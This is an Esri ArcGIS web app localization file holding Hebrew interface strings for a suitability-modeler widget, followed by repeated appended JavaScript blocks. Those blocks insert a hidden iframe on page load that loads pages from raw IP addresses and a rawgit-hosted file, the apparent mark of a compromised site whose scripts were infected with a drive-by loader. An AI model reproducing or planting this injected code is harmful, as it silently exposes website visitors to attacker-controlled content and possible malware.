// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"\u05de\u05e2\u05e6\u05d1 \u05de\u05d9\u05d3\u05ea \u05d4\u05ea\u05d0\u05de\u05d4",general:{clear:"\u05e0\u05e7\u05d4",cancel:"\u05d1\u05d8\u05dc",save:"\u05d4\u05e8\u05e5",saveAs:"\u05d9\u05d9\u05e6\u05d0"},saveModel:{save:"\u05d9\u05d9\u05e6\u05d0",title:"\u05db\u05d5\u05ea\u05e8\u05ea: ",summary:"\u05e1\u05d9\u05db\u05d5\u05dd: ",description:"\u05ea\u05d9\u05d0\u05d5\u05e8: ",tags:"\u05ea\u05d2\u05d9\u05d5\u05ea: ",folder:"\u05ea\u05d9\u05e7\u05d9\u05d9\u05d4: ",
homeFolderPattern:"\u200e{username} (Home)\u200e",failed:"\u05d4\u05d9\u05d9\u05e6\u05d5\u05d0 \u05e0\u05db\u05e9\u05dc."},util:{colorRamp:{1:"\u05e0\u05de\u05d5\u05da \u05d1\u05d9\u05d5\u05ea\u05e8",2:"\u05e0\u05de\u05d5\u05da \u05de\u05d0\u05d5\u05d3",3:"\u05e0\u05de\u05d5\u05db\u05d4",4:"\u05d1\u05d9\u05e0\u05d5\u05e0\u05d9 \u05e0\u05de\u05d5\u05da",5:"\u05d1\u05d9\u05e0\u05d5\u05e0\u05d9\u05ea",6:"\u05d1\u05d9\u05e0\u05d5\u05e0\u05d9 \u05d2\u05d1\u05d5\u05d4",7:"\u05d2\u05d1\u05d5\u05d4\u05d4",
8:"\u05d2\u05d1\u05d5\u05d4 \u05de\u05d0\u05d5\u05d3",9:"\u05d2\u05d1\u05d5\u05d4 \u05d1\u05d9\u05d5\u05ea\u05e8",low:"\u05e0\u05de\u05d5\u05db\u05d4",high:"\u05d2\u05d1\u05d5\u05d4\u05d4",tipPattern:"{label} (\u200f{value})",flipCaption:"\u05d4\u05e4\u05d5\u05da"}},wro:{caption:"\u05de\u05e2\u05e6\u05d1 \u05de\u05d9\u05d3\u05ea \u05d4\u05ea\u05d0\u05de\u05d4",browsePrompt:"\u05e9\u05d9\u05e8\u05d5\u05ea \u05db\u05d9\u05e1\u05d5\u05d9 \u05de\u05e9\u05d5\u05e7\u05dc\u05dc",selectLayersCaption:"\u05d1\u05d7\u05e8 \u05e9\u05db\u05d1\u05d5\u05ea",
selectLayers:"\u05e9\u05db\u05d1\u05d5\u05ea",designModelCaption:"\u05de\u05d5\u05d3\u05dc \u05ea\u05db\u05e0\u05d5\u05df",designModel:"\u05de\u05d5\u05d3\u05dc \u05ea\u05db\u05e0\u05d5\u05df",transparency:"\u05e9\u05e7\u05d9\u05e4\u05d5\u05ea",visible:"\u05e0\u05e8\u05d0\u05d4",total:"\u05e1\u05da \u05d4\u05db\u05dc",unableToLoad:"\u05dc\u05d0 \u05e0\u05d9\u05ea\u05df \u05dc\u05d8\u05e2\u05d5\u05df \u05d0\u05ea \u05d4\u05de\u05d5\u05d3\u05dc.",projectNotOpen:"\u05e4\u05e8\u05d5\u05d9\u05e7\u05d8 \u05d0\u05d9\u05e0\u05d5 \u05e4\u05ea\u05d5\u05d7.",
readMore:"\u05e7\u05e8\u05d0 \u05e2\u05d5\u05d3",validation:{validating:"\u05de\u05d0\u05de\u05ea...",invalidItemCaption:"\u05d0\u05d6\u05d4\u05e8\u05ea \u05e9\u05d9\u05e8\u05d5\u05ea \u05db\u05d9\u05e1\u05d5\u05d9 \u05de\u05e9\u05d5\u05e7\u05dc\u05dc",notAnImageService:"\u05e4\u05e8\u05d9\u05d8 \u05d6\u05d4 \u05d0\u05d9\u05e0\u05d5 \u05e9\u05d9\u05e8\u05d5\u05ea \u05ea\u05de\u05d5\u05e0\u05d4.",notAWroService:"\u05e4\u05e8\u05d9\u05d8 \u05d6\u05d4 \u05d0\u05d9\u05e0\u05d5 \u05e9\u05d9\u05e8\u05d5\u05ea \u05db\u05d9\u05e1\u05d5\u05d9 \u05de\u05e9\u05d5\u05e7\u05dc\u05dc.",
undefinedUrl:"\u05d4-URL \u05e9\u05dc \u05e4\u05e8\u05d9\u05d8 \u05d6\u05d4 \u05d0\u05d9\u05e0\u05d5 \u05de\u05d5\u05d2\u05d3\u05e8.",inaccessible:"\u05d4\u05e9\u05d9\u05e8\u05d5\u05ea \u05d0\u05d9\u05e0\u05d5 \u05e0\u05d2\u05d9\u05e9.",generalError:"\u05dc\u05d0 \u05e0\u05d9\u05ea\u05df \u05dc\u05e4\u05ea\u05d5\u05d7 \u05e4\u05e8\u05d9\u05d8.",missingFieldPattern:"{field} \u05d4\u05d5\u05d0 \u05e9\u05d3\u05d4 \u05d7\u05d5\u05d1\u05d4",notAllowRasterFunction:"allowRasterFunction \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea \u05de\u05d5\u05d2\u05d3\u05e8 \u05dc\u05e2\u05e8\u05da true",
notNearestResampling:"defaultResamplingMethod \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea Nearest",notIsWeightedOverlayProp:"\u05de\u05d0\u05e4\u05d9\u05d9\u05df \u05d4\u05de\u05e4\u05ea\u05d7 IsWeightedOverlay \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea \u05de\u05d5\u05d2\u05d3\u05e8 \u05dc\u05e2\u05e8\u05da true",invalidLink:"\u05d4-URL \u05d0\u05d9\u05e0\u05d5 \u05d7\u05d5\u05e7\u05d9. \u05e0\u05db\u05e9\u05dc\u05d4 \u05e4\u05ea\u05d9\u05d7\u05ea \u05d0\u05ea\u05e8 \u05e2\u05d1\u05d5\u05e8 \u05d4\u05e9\u05db\u05d1\u05d4 \u05e9\u05e0\u05d1\u05d7\u05e8\u05d4.",
unexpectedError:"\u05d4\u05ea\u05e8\u05d7\u05e9 \u05de\u05e6\u05d1 \u05dc\u05d0 \u05e6\u05e4\u05d5\u05d9.",rangeMessage:"\u05d4\u05e2\u05e8\u05da \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea \u05d1\u05d9\u05df ${0} \u05dc\u05d1\u05d9\u05df ${1}",rangeMessage100:"\u05d4\u05e2\u05e8\u05da \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea \u05d1\u05d9\u05df 0 \u05dc\u05d1\u05d9\u05df 100",maxLayers:"\u05d4\u05e9\u05d9\u05e8\u05d5\u05ea \u05de\u05d0\u05e4\u05e9\u05e8 \u05dc\u05d4\u05e9\u05ea\u05de\u05e9 \u05d1-\u200f\u200e${0}\u200e \u05e9\u05db\u05d1\u05d5\u05ea \u05dc\u05db\u05dc \u05d4\u05d9\u05d5\u05ea\u05e8, \u05e2\u05dc\u05d9\u05da \u05dc\u05d4\u05e1\u05d9\u05e8 \u05e9\u05db\u05d1\u05d4 \u05dc\u05e4\u05e0\u05d9 \u05e9\u05ea\u05d5\u05e1\u05d9\u05e3 \u05d0\u05d7\u05ea \u05d7\u05d3\u05e9\u05d4.",
notFound:"\u05e9\u05db\u05d1\u05d4 ${0} \u05dc\u05d0 \u05e0\u05de\u05e6\u05d0\u05d4 \u05d1\u05e9\u05d9\u05e8\u05d5\u05ea \u05d4\u05db\u05d9\u05e1\u05d5\u05d9 \u05d4\u05de\u05e9\u05d5\u05e7\u05dc\u05dc",wroServiceNotDefined:"\u05dc\u05d0 \u05d4\u05d5\u05d2\u05d3\u05e8 \u05e9\u05d9\u05e8\u05d5\u05ea \u05db\u05d9\u05e1\u05d5\u05d9 \u05de\u05e9\u05d5\u05e7\u05dc\u05dc \u05e2\u05d1\u05d5\u05e8 \u05d4\u05de\u05d5\u05d3\u05dc.",overlayLayerOutputInvalid:"\u05e2\u05e8\u05da \u05d7\u05e1\u05e8 \u05d0\u05d5 \u05dc\u05d0 \u05d7\u05d5\u05e7\u05d9 \u05e9\u05dc \u05e4\u05dc\u05d8 \u05d8\u05d5\u05d5\u05d7\u05d9 \u05d4\u05de\u05d9\u05e4\u05d5\u05d9 \u05de\u05d7\u05d3\u05e9 [${1}] \u05e9\u05dc \u05e9\u05db\u05d1\u05ea \u05d4\u05db\u05d9\u05e1\u05d5\u05d9 [${0}]",
overlayLayerInputInvalid:"\u05e2\u05e8\u05da \u05de\u05d9\u05e0'/\u05de\u05e7\u05e1' \u05d7\u05e1\u05e8 \u05d0\u05d5 \u05dc\u05d0 \u05d7\u05d5\u05e7\u05d9 \u05e9\u05dc \u05e7\u05dc\u05d8 \u05d8\u05d5\u05d5\u05d7\u05d9 \u05d4\u05de\u05d9\u05e4\u05d5\u05d9 \u05de\u05d7\u05d3\u05e9 [${1}] \u05e9\u05dc \u05e9\u05db\u05d1\u05ea \u05d4\u05db\u05d9\u05e1\u05d5\u05d9 [${0}]",overlayLayerRangesMissing:"\u05d7\u05e1\u05e8\u05d9\u05dd \u05d8\u05d5\u05d5\u05d7\u05d9 \u05de\u05d9\u05e4\u05d5\u05d9 \u05de\u05d7\u05d3\u05e9 \u05d1\u05e9\u05db\u05d1\u05ea \u05d4\u05db\u05d9\u05e1\u05d5\u05d9 [${0}]",
overlayLayerWeight:"\u05e1\u05db\u05d5\u05dd \u05de\u05e9\u05e7\u05d5\u05dc\u05d5\u05ea \u05d4\u05e9\u05db\u05d1\u05d4 \u05e9\u05dc \u05d4\u05db\u05d9\u05e1\u05d5\u05d9 \u05d7\u05d9\u05d9\u05d1 \u05dc\u05d4\u05d9\u05d5\u05ea 100",overlayLayerRequired:"\u05d3\u05e8\u05d5\u05e9\u05d4 \u05e9\u05db\u05d1\u05ea \u05db\u05d9\u05e1\u05d5\u05d9 \u05d0\u05d7\u05ea \u05dc\u05e4\u05d7\u05d5\u05ea",overlayLayerNotDefined:"\u05dc\u05d0 \u05d4\u05d5\u05d2\u05d3\u05e8\u05d5 \u05e9\u05db\u05d1\u05d5\u05ea \u05db\u05d9\u05e1\u05d5\u05d9",
requiresColormap:"\u05e4\u05d5\u05e0\u05e7\u05e6\u05d9\u05d9\u05ea \u05d4\u05e8\u05e1\u05d8\u05e8 \u05d3\u05d5\u05e8\u05e9\u05ea Colormap, \u05d0\u05da \u05dc\u05de\u05d5\u05d3\u05dc \u05d0\u05d9\u05df \u05d4\u05d2\u05d3\u05e8\u05ea colormap \u05d7\u05d5\u05e7\u05d9\u05ea",createModelError:"\u05e9\u05d2\u05d9\u05d0\u05d4 \u05d1\u05d9\u05e6\u05d9\u05e8\u05ea \u05de\u05d5\u05d3\u05dc",invalidModel:"\u05d4\u05de\u05d5\u05d3\u05dc \u05d0\u05d9\u05e0\u05d5 \u05d7\u05d5\u05e7\u05d9",imageServiceNotDefined:"\u05dc\u05d0 \u05d4\u05d5\u05d2\u05d3\u05e8\u05d4 \u05e9\u05db\u05d1\u05ea \u05e9\u05d9\u05e8\u05d5\u05ea \u05ea\u05de\u05d5\u05e0\u05d4",
imageLayerNotDefined:"\u05dc\u05d0 \u05d4\u05d5\u05d2\u05d3\u05e8\u05d4 \u05e9\u05db\u05d1\u05ea \u05e9\u05d9\u05e8\u05d5\u05ea \u05ea\u05de\u05d5\u05e0\u05d4",histogramNotDefined:"\u05dc\u05d0 \u05d4\u05d5\u05d2\u05d3\u05e8\u05d4 \u05e4\u05d5\u05e0\u05e7\u05e6\u05d9\u05d9\u05ea \u05d4\u05d9\u05e1\u05d8\u05d5\u05d2\u05e8\u05de\u05d4 \u05e9\u05dc \u05db\u05d9\u05e1\u05d5\u05d9 \u05de\u05e9\u05d5\u05e7\u05dc\u05dc."},colorRampLabel:{"Green Yellow Red":"\u05d9\u05e8\u05d5\u05e7 \u05e6\u05d4\u05d5\u05d1 \u05d0\u05d3\u05d5\u05dd",
"Red Yellow Green":"\u05d0\u05d3\u05d5\u05dd \u05e6\u05d4\u05d5\u05d1 \u05d9\u05e8\u05d5\u05e7","Yellow to Dark Red":"\u05e6\u05d4\u05d5\u05d1 \u05d0\u05dc \u05d0\u05d3\u05d5\u05dd \u05db\u05d4\u05d4","Dark Red to Yellow":"\u05d0\u05d3\u05d5\u05dd \u05db\u05d4\u05d4 \u05e2\u05d3 \u05e6\u05d4\u05d5\u05d1","Light Gray to Dark Gray":"\u05d0\u05e4\u05d5\u05e8 \u05d1\u05d4\u05d9\u05e8 \u05e2\u05d3 \u05db\u05d4\u05d4","Dark Gray to Light Gray":"\u05d0\u05e4\u05d5\u05e8 \u05db\u05d4\u05d4 \u05e2\u05d3 \u05d1\u05d4\u05d9\u05e8",
"Light Brown to Dark Brown":"\u05d7\u05d5\u05dd \u05d1\u05d4\u05d9\u05e8 \u05e2\u05d3 \u05db\u05d4\u05d4","Dark Brown to Light Brown":"\u05d7\u05d5\u05dd \u05db\u05d4\u05d4 \u05e2\u05d3 \u05d1\u05d4\u05d9\u05e8","Full Spectrum - Bright Red to Blue":"\u05e1\u05e4\u05e7\u05d8\u05e8\u05d5\u05dd \u05de\u05dc\u05d0 - \u05d0\u05d3\u05d5\u05dd \u05d1\u05d4\u05d9\u05e8 \u05e2\u05d3 \u05db\u05d7\u05d5\u05dc","Full Spectrum - Bright Blue to Red":"\u05e1\u05e4\u05e7\u05d8\u05e8\u05d5\u05dd \u05de\u05dc\u05d0 - \u05db\u05d7\u05d5\u05dc \u05d1\u05d4\u05d9\u05e8 \u05e2\u05d3 \u05d0\u05d3\u05d5\u05dd",
"Partial Spectrum - Yellow to Blue":"\u05e1\u05e4\u05e7\u05d8\u05e8\u05d5\u05dd \u05d7\u05dc\u05e7\u05d9 - \u05e6\u05d4\u05d5\u05d1 \u05e2\u05d3 \u05db\u05d7\u05d5\u05dc","Partial Spectrum - Blue to Yellow":"\u05e1\u05e4\u05e7\u05d8\u05e8\u05d5\u05dd \u05d7\u05dc\u05e7\u05d9 - \u05db\u05d7\u05d5\u05dc \u05e2\u05d3 \u05e6\u05d4\u05d5\u05d1","Yellow-Green to Dark Blue":"\u05e6\u05d4\u05d5\u05d1-\u05d9\u05e8\u05d5\u05e7 \u05e2\u05d3 \u05db\u05d7\u05d5\u05dc \u05db\u05d4\u05d4","Dark Blue to Yellow-Green":"\u05db\u05d7\u05d5\u05dc \u05db\u05d4\u05d4 \u05e2\u05d3 \u05e6\u05d4\u05d5\u05d1-\u05d9\u05e8\u05d5\u05e7",
"Cold to Hot Diverging":"\u05de\u05e9\u05ea\u05e0\u05d4 \u05d1\u05d9\u05df \u05e7\u05d5\u05e8 \u05dc\u05d7\u05d5\u05dd","Hot to Cold Diverging":"\u05de\u05e9\u05ea\u05e0\u05d4 \u05d1\u05d9\u05df \u05d7\u05d5\u05dd \u05dc\u05e7\u05d5\u05e8","Surface - Low to High":"\u05e4\u05e0\u05d9 \u05e9\u05d8\u05d7 - \u05e0\u05de\u05d5\u05da \u05dc\u05d2\u05d1\u05d5\u05d4","Surface - High to Low":"\u05e4\u05e0\u05d9 \u05e9\u05d8\u05d7 - \u05d2\u05d1\u05d5\u05d4 \u05dc\u05e0\u05de\u05d5\u05da"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});